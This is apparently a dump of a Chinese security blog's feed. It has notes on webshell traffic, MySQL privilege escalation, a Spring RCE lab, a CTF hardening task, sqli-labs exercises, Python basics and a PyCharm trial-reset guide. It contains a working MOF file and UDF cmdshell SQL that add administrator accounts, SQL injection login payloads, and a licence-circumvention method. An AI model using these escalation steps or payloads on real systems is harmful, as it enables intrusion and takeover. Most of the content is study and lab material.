title="26.冰蝎连接的特征和原理"></a>26.冰蝎连接的特征和原理</h2><p>冰蝎的通信过程可以分为两个阶段：1、密钥协商2、加密传输<br>第一阶段-密钥协商<br>1）攻击者通过 GET 或者 POST 方法，形如 <a href="http://127.0.0.1/shell.aspx?pass=645">http://127.0.0.1/shell.aspx?pass=645</a> 的请求服务器密钥；<br>2）服务器使用随机数 MD5 的高16位作为密钥，存储到会话的 $_SESSION 变量中，并返回密钥给攻击者。<br>第二阶段-加密传输<br>1）客户端把待执行命令作为输入，利用 AES 算法或 XOR 运算进行加密，并发送至服务端；2）服务端接受密<br>文后进行 AES 或 XOR 运算解密，执行相应的命令；3）执行结果通过AES加密后返回给攻击者。</p><p>冰蝎特征检测<br>总结冰蝎在流量交互中的特征，这些特征可分为两类。一类是可绕过特征，这类特征攻击者可通过构造报文进行绕<br>过，致使设备检测不到冰蝎 webshell 特征。另一类是非可绕过特征，攻击者在某些情景无法更改 HTTP 某些字<br>段，致使有固定报文字段可供设备检测。使用单个特征误报较高，但多个特征配合使用可降低误报，推荐多个特征<br>搭配使用，进一步提升特征检测的准确性。<br>详细：<a href="https://zhuanlan.zhihu.com/p/135227454">https://zhuanlan.zhihu.com/p/135227454</a></p><h2 id="27-菜刀的原理与特征"><a href="#27-菜刀的原理与特征" class="headerlink" title="27.菜刀的原理与特征"></a>27.菜刀的原理与特征</h2><h2 id="28-sql会手工注入嘛，order-by和limit后面改怎么写"><a href="#28-sql会手工注入嘛，order-by和limit后面改怎么写" class="headerlink" title="28.sql会手工注入嘛，order by和limit后面改怎么写"></a>28.sql会手工注入嘛，order by和limit后面改怎么写</h2><p>order by是mysql中对查询数据进行排序的方法，后面可以跟列名或一个数字，比如id是user表第一列的列名，那<br>么填id或1的效果是一样的<br>LIMIT[位置偏移量,]行数<br>其中，中括号里面的参数是可选参数，位置偏移量是指MySQL查询分析器要从哪一行开始显示，索引值从0开始，即<br>第一条记录位置偏移量是0，第二条记录的位置偏移量是1,依此类推…，第二个参数为“行数”即指示返回的记录条数。<br>limit后面还可以拼接into和produce函数，其中into可以用来写文件，用procedure analyse()这个子查询<br>而且只能用extractvalue 和 benchmark 函数进行延时</p><h2 id="mysql提权方式"><a href="#mysql提权方式" class="headerlink" title="mysql提权方式"></a>mysql提权方式</h2><h3 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h3><p>1.原理<br>在windows平台下，c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof这个文件会每间隔一段时间（很短暂）就会以system权限执行一次，所以，只要我们将我们先要做的事通过代码存储到这个mof文件中，就可以实现权限提升。</p><p>2.利用条件</p><p>mysql用户具有root权限(对上面那个目录可写）<br>关闭了secure-file-priv<br>3.利用方式<br>下面是一段写好了的mof利用代码</p><pre class="line-numbers language-none"><code class="language-none">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) instance of __EventFilter as $EventFilter&#123; EventNamespace &#x3D; &quot;Root\\Cimv2&quot;; Name  &#x3D; &quot;filtP2&quot;;     Query &#x3D; &quot;Select \ From __InstanceModificationEvent &quot;             &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;             &quot;And TargetInstance.Second &#x3D; 5&quot;; QueryLanguage &#x3D; &quot;WQL&quot;; &#125;; instance of ActiveScriptEventConsumer as $Consumer &#123;     Name &#x3D; &quot;consPCSV2&quot;; ScriptingEngine &#x3D; &quot;JScript&quot;; ScriptText &#x3D;     &quot;var WSH &#x3D; new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user admin admin &#x2F;add&quot;)&quot;; &#125;; instance of __FilterToConsumerBinding&#123;     Consumer   &#x3D; $Consumer;     Filter &#x3D; $EventFilter; &#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这段代码只是在目标系统上添加了一个admin用户，并没有添加到管理员组（如果需要自行查找，网上很多），将这个文件存储为nullevt.mof上传到任意一个你在目标机上可写的路径(当然，如果你直接可以写到c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;就更好了)，接下来我们就可以直接执行sql语句把该文件写入到目标路径：</p><pre class="line-numbers language-none"><code class="language-none">select load_file(&#39;你上传的路径&#x2F;nullevt.mof&#39;) into dumpfile &#39;c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h3><p>1.原理<br>UDF提权是利用MYSQL的自定义函数功能，将MYSQL账号转化为系统system权限</p><p>2.利用条件</p><p>Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下。<br>Mysql版本小于5.1版本。udf.dll文件在Windows2003下放置于c:\windows\system32，在windows2000下放置于c:\winnt\system32。<br>掌握的mysql数据库的账号有对mysql的insert和delete权限以创建和抛弃函数，一般以root账号为佳，具备&#96;root账号所具备的权限的其它账号也可以。<br>可以将udf.dll写入到相应目录的权限。</p><p>注：关于plugin目录，可在mysql中执行</p><pre class="line-numbers language-none"><code class="language-none">show variables like &#39;%plugin%&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进行查看，这个目录也就是dll文件需要导入的目录</p><p>3.利用方式</p><p>将dll文件导入到相应目录，如果导入错误会产生can&#96;t open shared library错误<br>创建自定义函数</p><pre class="line-numbers language-none"><code class="language-none">create function cmdshell returns string soname &#39;udf.dll&#39;;select cmdshell(&#39;net user miao zjicmisa.org &#x2F;add&#39;);select cmdshell(&#39;net localgroup administrators miao &#x2F;add&#39;);drop function cmdshell; 删除函数delete from mysql.func where name&#x3D;&#39;cmdshell&#39;  删除函数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 护网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 护网 </tag>
            
            <tag> 蓝队 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>spring-core-rec-2022-03-29漏洞复现</title>
      <link href="/2022/03/31/2022-03-31-spring-core-rec-2022-03-29-lou-dong-fu-xian/"/>
      <url>/2022/03/31/2022-03-31-spring-core-rec-2022-03-29-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h2 id="特别感谢"><a href="#特别感谢" class="headerlink" title="特别感谢"></a>特别感谢</h2><p><a href="https://www.beigui.xyz/">光栋哥</a></p><p>不嫌我菜一点一点的教我</p><p>前天3月29晚上爆出来的<code>spring</code>漏洞 圈里大佬称比<code>log4j2</code>更猛</p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220331232314448.png"></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220331232344706.png"></p><p><strong>开干</strong></p><p>Ubuntu准备好docker</p><p>直接拉环境<code>docker run -dit -P vulfocus/spring-core-rce-2022-03-29</code></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220331230748570.png"></p><p>下载完成使用docker -ps -a查看端口号</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220331231249591.png"></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220331231321475.png"></p><h2 id="over"><a href="#over" class="headerlink" title="over"></a><strong>over</strong></h2>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> spring-core-rec-2022-03-29 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF加固题</title>
      <link href="/2022/03/31/2022-03-31-buuctf-jia-gu-ti/"/>
      <url>/2022/03/31/2022-03-31-buuctf-jia-gu-ti/</url>
      
        <content type="html"><![CDATA[<h2 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h2><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220331111404354.png"></p><p>第一行：目标机器 WEB 服务地址</p><p>第二行：目标机器 SSH 地址以及端口</p><p>第三行：Check 服务访问地址</p><h3 id="修复过程"><a href="#修复过程" class="headerlink" title="修复过程"></a>修复过程</h3><ol><li>SSH 连接上目标机器，用户 ctf，密码 123456。</li><li>对目标机器上的服务进行加固。</li><li>访问 Check 服务的 &#x2F;check进行 check。</li><li>若返回 True，则访问 &#x2F;flag 可获得 &#x2F;flag。</li><li>每次 check 后目标机器会重置。</li></ol><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p><code>finalshell</code></p><p>好久之前在网上看教程就觉得这个工具无论是界面还是功能都比较直观 一眼就知道是干什么的 当然<code>xshell</code>也可以</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220331130226878.png" alt="finalshell操作界面"></p><p>打开第三个连接</p><p>登陆页面 使用万能密码登陆 </p><p>用户名：<code>admin&#39; or 1=1#</code></p><p>密码：<code>123</code></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220331130806094.png" alt="提示登陆成功"></p><p>那么需要加固的点就是sql注入</p><h3 id="ssh连接服务器进行加固"><a href="#ssh连接服务器进行加固" class="headerlink" title="ssh连接服务器进行加固"></a>ssh连接服务器进行加固</h3><p>进入<code>www/var/html</code>查看index.html</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220331135156977.png"></p><p>在此处添加</p><pre class="line-numbers language-none"><code class="language-none">$username &#x3D; addslashes($username);$password &#x3D; addslashes($password);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>addslashes()</strong></p><pre class="line-numbers language-none"><code class="language-none">addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。预定义字符是：      单引号（’）      双引号（&quot;）      反斜杠（\）      NULL  该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再次打开目标机器 WEB 服务地址 使用万能密码登陆 发现提示密码错误</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220331135750800.png"></p><p>访问Check 服务访问地址 在连接后面加上&#x2F;check 等待60s</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220331135541891.png"></p><p>访问flag 在连接后加上&#x2F;flag得到flag</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220331143719851.png"></p>]]></content>
      
      
      <categories>
          
          <category> 加固 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 加固 </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpstudy调出mysql命令行</title>
      <link href="/2022/03/20/2022-03-20-phpstudy-diao-chu-mysql-ming-ling-xing/"/>
      <url>/2022/03/20/2022-03-20-phpstudy-diao-chu-mysql-ming-ling-xing/</url>
      
        <content type="html"><![CDATA[<p>首先找到MySQL所在的根目录 <code>设置&gt;文件位置&gt;MySQL</code></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220320200029895.png"></p><p>然后桌面点击 <code>此电脑-属性-高级系统保护-高级-环境变量</code></p><p>弹出的对话框有上下两个新建 点击下面那个 分别填入变量名与变量值（变量值要根据自己的mysql所在根目录填写）</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220320200346760.png"></p><pre class="line-numbers language-none"><code class="language-none">MYSQL_HOMED:\phpstudy_pro\Extensions\MySQL5.7.26%MYSQL_HOME%\bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在<code>Path</code>中双击粘贴</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220320200528538.png"></p><p>测试一下</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220320200613986.png"></p>]]></content>
      
      
      <categories>
          
          <category> Markdown </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Typora </tag>
            
            <tag> Markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入之sqli-labs刷题记录</title>
      <link href="/2022/03/18/2022-03-18-sql-zhu-ru-zhi-sqli-labs-shua-ti-ji-lu/"/>
      <url>/2022/03/18/2022-03-18-sql-zhu-ru-zhi-sqli-labs-shua-ti-ji-lu/</url>
      
        <content type="html"><![CDATA[<p>z</p><p>正儿八经接触安全一年左右了，一直害怕SQL注入，不敢刷题今天开始持续刷通关</p><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><pre class="line-numbers language-none"><code class="language-none">查库：select schema_name from information_schema.schemata;查表：select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39;;查列：select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39;;查字段：select username,password from security.users;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="MySQL注释符"><a href="#MySQL注释符" class="headerlink" title="MySQL注释符"></a>MySQL注释符</h3><pre class="line-numbers language-none"><code class="language-none">1：--+ 2：--空格3：#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>目的是为了将mysql后面的语句注释掉不再执行 前面自己添加参数</p><h3 id="or-and"><a href="#or-and" class="headerlink" title="or and"></a>or and</h3><pre class="line-numbers language-none"><code class="language-none">A and BTrueA跟B必须同时正确返回正确A or BTrueA跟B有一个正确返回正确<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="理解limit"><a href="#理解limit" class="headerlink" title="理解limit"></a>理解limit</h3><p><code>SELECT * FROM users WHERE id=&#39;1&#39; LIMIT 0,1</code></p><p>limit 0,1;    第一位表示从第几个开始，比如0从第一个开始，而第二位的1代表的的就是显示多少行数据</p><pre class="line-numbers language-none"><code class="language-none">mysql&gt; SELECT * FROM users LIMIT 2,1;+----+----------+----------+| id | username | password |+----+----------+----------+|  3 | Dummy    | p@ssword |+----+----------+----------+1 row in set (0.00 sec)mysql&gt; SELECT * FROM users LIMIT 3,1;+----+----------+----------+| id | username | password |+----+----------+----------+|  4 | secure   | crappy   |+----+----------+----------+1 row in set (0.00 sec)mysql&gt; SELECT * FROM users LIMIT 0,2;+----+----------+------------+| id | username | password   |+----+----------+------------+|  1 | Dumb     | Dumb       ||  2 | Angelina | I-kill-you |+----+----------+------------+2 rows in set (0.00 sec)mysql&gt; SELECT * FROM users LIMIT 0,5;+----+----------+------------+| id | username | password   |+----+----------+------------+|  1 | Dumb     | Dumb       ||  2 | Angelina | I-kill-you ||  3 | Dummy    | p@ssword   ||  4 | secure   | crappy     ||  5 | stupid   | stupidity  |+----+----------+------------+5 rows in set (0.00 sec)mysql&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h3><p>对某一列进行排序</p><pre class="line-numbers language-none"><code class="language-none">mysql&gt; select * from users;+----+----------+------------+| id | username | password   |+----+----------+------------+|  1 | Dumb     | Dumb       ||  2 | Angelina | I-kill-you ||  3 | Dummy    | p@ssword   ||  4 | secure   | crappy     ||  5 | stupid   | stupidity  ||  6 | superman | genious    ||  7 | batman   | mob!le     ||  8 | admin    | admin      ||  9 | admin1   | admin1     || 10 | admin2   | admin2     || 11 | admin3   | admin3     || 12 | dhakkan  | dumbo      || 14 | admin4   | admin4     |+----+----------+------------+13 rows in set (0.00 sec)mysql&gt; select * from users order by 1;+----+----------+------------+| id | username | password   |+----+----------+------------+|  1 | Dumb     | Dumb       ||  2 | Angelina | I-kill-you ||  3 | Dummy    | p@ssword   ||  4 | secure   | crappy     ||  5 | stupid   | stupidity  ||  6 | superman | genious    ||  7 | batman   | mob!le     ||  8 | admin    | admin      ||  9 | admin1   | admin1     || 10 | admin2   | admin2     || 11 | admin3   | admin3     || 12 | dhakkan  | dumbo      || 14 | admin4   | admin4     |+----+----------+------------+13 rows in set (0.00 sec)mysql&gt; select * from users order by 2;+----+----------+------------+| id | username | password   |+----+----------+------------+|  8 | admin    | admin      ||  9 | admin1   | admin1     || 10 | admin2   | admin2     || 11 | admin3   | admin3     || 14 | admin4   | admin4     ||  2 | Angelina | I-kill-you ||  7 | batman   | mob!le     || 12 | dhakkan  | dumbo      ||  1 | Dumb     | Dumb       ||  3 | Dummy    | p@ssword   ||  4 | secure   | crappy     ||  5 | stupid   | stupidity  ||  6 | superman | genious    |+----+----------+------------+13 rows in set (0.00 sec)mysql&gt; select * from users order by 3;+----+----------+------------+| id | username | password   |+----+----------+------------+|  8 | admin    | admin      ||  9 | admin1   | admin1     || 10 | admin2   | admin2     || 11 | admin3   | admin3     || 14 | admin4   | admin4     ||  4 | secure   | crappy     ||  1 | Dumb     | Dumb       || 12 | dhakkan  | dumbo      ||  6 | superman | genious    ||  2 | Angelina | I-kill-you ||  7 | batman   | mob!le     ||  3 | Dummy    | p@ssword   ||  5 | stupid   | stupidity  |+----+----------+------------+13 rows in set (0.00 sec)mysql&gt; select * from users order by 4;报错ERROR 1054 (42S22): Unknown column &#39;4&#39; in &#39;order clause&#39;mysql&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过order by 可以测试出在第几列中报错 从而得出该数据库有几列数据</p><h2 id="less-01"><a href="#less-01" class="headerlink" title="less-01:"></a>less-01:</h2><h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220320210125388.png"></h3><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220320210145185.png"></p><p>当执行<code>?id=1&#39; order by 4 --+</code>报错<code>?id=1&#39; order by 3 --+</code>时没有报错说明该表有3列数据</p>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> sqli-labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pycharm2021破解安装汉化</title>
      <link href="/2022/03/10/2022-03-10-pycharm2021-po-jie-an-zhuang-han-hua/"/>
      <url>/2022/03/10/2022-03-10-pycharm2021-po-jie-an-zhuang-han-hua/</url>
      
        <content type="html"><![CDATA[<h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>登陆后退出账号卡无限免费试用30天</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>在官网直接下载或者使用我的链接<code>https://www.aliyundrive.com/s/2M4y1fn8XQA</code> </p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220310144505497.png"></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220310144517218.png"></p><p>选择自己要安装的位置</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220310144549424.png"></p><p>看不懂就都选上</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220310144556579.png"></p><p>到这一步就正常安装完了 直接打开</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220310153452113.png"></p><p>然后会跳转到浏览器让你注册登陆 完成后就可以新建文件了</p><h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><p>插件下载地址<code>https://wwi.lanzouy.com/iexWX019edib</code></p><p>把插件<code>.zip</code>格式直接拖到<code>pycharm</code>中</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220310153927051.png"></p><p>再点击工具栏中的  <code>Help</code> ，再点击最下面的 <code>Eval Reset</code>，进入刚才安装的插件的主页面。</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/WX20211027-154254@2x.png" alt="图中标记的两个选项都要勾选！！！"></p><p>然后点击 <code>Reset</code>，会有个弹窗，直接点击 <code>Yes</code> 重启 PyCharm。</p><p>重启 <code>PyCharm</code> 之后，再次点击最上面工具栏的  <code>Help</code>  中的  <code>Register...</code>，会显示你并没有登录自己的账户，但是 PyCharm 依旧处于试用状态！</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220310154248729.png"></p><h2 id="汉化"><a href="#汉化" class="headerlink" title="汉化"></a>汉化</h2><p>工具栏<code>file</code>-<code>setting</code>-<code>Plugins</code>—<code>Marketplace</code><br>搜索<code>Chinese</code></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220310154500148.png"></p><h2 id="激活码生成"><a href="#激活码生成" class="headerlink" title="激活码生成"></a>激活码生成</h2><p>地址：<a href="http://idea.javatiku.cn/"><code>intellij idea注册码,idea激活码,idea破解教程,idea破解插件,idea注册码在线生成 (javatiku.cn)</code></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Pycharm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python笔记</title>
      <link href="/2022/03/10/2022-03-10-python-bi-ji/"/>
      <url>/2022/03/10/2022-03-10-python-bi-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="03x10-day1"><a href="#03x10-day1" class="headerlink" title="03x10 day1"></a>03x10 day1</h2><hr><hr><pre class="line-numbers language-none"><code class="language-none">a &#x3D; 1print(type(a))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>定义变量a&#x3D;1 输出a的数据类型</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220310174049404.png"></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220310174146981.png" alt="image-20220310174146981"></p><hr><p>不管原来是什么数据库类型 只要加上<code>&#39;&#39;</code>最后都是字符串类型</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220310174451969.png"></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220310174520829.png"></p><hr><p>占位符(%d)形式的字符串输出</p><pre class="line-numbers language-none"><code class="language-none">a &#x3D; 10print(&#39;a的值是%d&#39; %a)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>跟c语言输出类似 但是也有不同 </p><p>c语言:   <code>printf(&quot;a的值是%d&quot;,&amp;a);</code></p><p>python:<code>print(&#39;a的值是%d&#39; %a)</code></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220310175836496.png">        </p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220310175951152.png"></p><p>如果要输出多个需要用户括号一起括起来</p><pre class="line-numbers language-none"><code class="language-none">print(&#39;name: %s age: %d&#39; % (&#39;Tom&#39;,12))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220310180659239.png"></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220310180722246.png"></p><h3 id="占位符表"><a href="#占位符表" class="headerlink" title="占位符表"></a>占位符表</h3><table><thead><tr><th align="center">格式符号</th><th align="center">转换</th></tr></thead><tbody><tr><td align="center">%c</td><td align="center">字符</td></tr><tr><td align="center">%s</td><td align="center">字符串</td></tr><tr><td align="center">%d</td><td align="center">有符号十进制整数</td></tr><tr><td align="center">%u</td><td align="center">无符号十进制整数</td></tr><tr><td align="center">%o</td><td align="center">八进制整数</td></tr><tr><td align="center">%x</td><td align="center">十六进制整数（小写字母0x）</td></tr><tr><td align="center">%X</td><td align="center">十六进制整数（大写字母0X）</td></tr><tr><td align="center">%f</td><td align="center">浮点数</td></tr><tr><td align="center">%e</td><td align="center">科学计数法（小写’e’）</td></tr><tr><td align="center">%E</td><td align="center">科学计数法（大写’E’）</td></tr><tr><td align="center">%g</td><td align="center">%f和%e的简写</td></tr><tr><td align="center">%G</td><td align="center">%f和%E的简写</td></tr></tbody></table><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220310182310975.png"></p><h3 id="f-string"><a href="#f-string" class="headerlink" title="f-string"></a>f-string</h3><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220310182828291.png"></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220310182901033.png"></p><p><code>f&#39; &#39;</code>并不是必须写在print里面的 只是使用print输出 <code>跟%d不同</code></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220310183131525.png"></p><hr><h3 id="输入函数input"><a href="#输入函数input" class="headerlink" title="输入函数input"></a>输入函数input</h3><pre class="line-numbers language-none"><code class="language-none">a &#x3D; input(&#39;please input a number:&#39;)print(a)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220310211500570.png"></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220310211526278.png"></p><p>input从键盘获取的数据。无论输入的是什么，得到的都是字符串类型</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220310211728458.png"></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220310211737949.png"></p><p>因为得到的是字符串类型 所以相加得到的数是拼接而成 并不是相加</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220310212048674.png"></p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220310212113075.png" alt="image-20220310212113075" style="zoom:150%;" /><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><table><thead><tr><th align="center">运算符</th><th>描述</th><th>实例</th></tr></thead><tbody><tr><td align="center">+</td><td>加</td><td>两个对象相加a + b 输出结果30</td></tr><tr><td align="center">-</td><td>减</td><td>得到负数或是一个数减去另一个数 a - b输出结果-10</td></tr><tr><td align="center">*</td><td>乘</td><td>两个数相乘或是返回一个重复若干次的字符串a*b输出结果200</td></tr><tr><td align="center">&#x2F;</td><td>除</td><td>b&#x2F;a输出结果2</td></tr><tr><td align="center">&#x2F;&#x2F;</td><td>取整除</td><td>返回商的整数部分9&#x2F;&#x2F;2输出结果4，9.0&#x2F;&#x2F;2.0输出结果4.0</td></tr><tr><td align="center">%</td><td>取余</td><td>返回除法的余数b % a 输出结果被 0</td></tr><tr><td align="center">**</td><td>指数</td><td>a**b为10的20次方，输出结果10000000000000000000</td></tr></tbody></table><p><code>**</code>高于<code>*</code>   <code>/</code>  <code>//</code>     <code>%</code>高于 <code>+</code>   <code>-</code> 不同类型的数字在进行混合运算时，整数将会转换成浮点数进行运算</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220310220140606.png"></p><h3 id="复合赋值运算符"><a href="#复合赋值运算符" class="headerlink" title="复合赋值运算符"></a>复合赋值运算符</h3><table><thead><tr><th>运算符</th><th>描述</th><th>实例</th></tr></thead><tbody><tr><td>+&#x3D;</td><td>加法赋值运算</td><td>c + &#x3D; a等于c &#x3D; c + a</td></tr><tr><td>-&#x3D;</td><td>减法赋值运算</td><td>c - &#x3D; a等于c &#x3D; c - a</td></tr><tr><td>*&#x3D;</td><td>乘法赋值运算</td><td>c * &#x3D; a 等于c &#x3D; c  * a</td></tr><tr><td>&#x2F;&#x3D;</td><td>除法赋值运算</td><td>c &#x2F; &#x3D; a 等于 c &#x3D; c &#x2F; a</td></tr><tr><td>%&#x3D;</td><td>取模赋值运算</td><td>c % &#x3D; a等于c &#x3D; c % a</td></tr><tr><td>**&#x3D;</td><td>幂赋值运算</td><td>c * * &#x3D; a等于c &#x3D; c * * a</td></tr><tr><td>&#x2F;&#x2F;&#x3D;</td><td>取整除赋值运算</td><td>c &#x2F; &#x2F; &#x3D; a等于c &#x3D; c &#x2F;  &#x2F; a</td></tr></tbody></table><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220310221757986.png"></p><h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/img/image-20220310222132744.png"></p><h3 id="chr函数-数字转字符-ascii码"><a href="#chr函数-数字转字符-ascii码" class="headerlink" title="chr函数 数字转字符(ascii码)"></a>chr函数 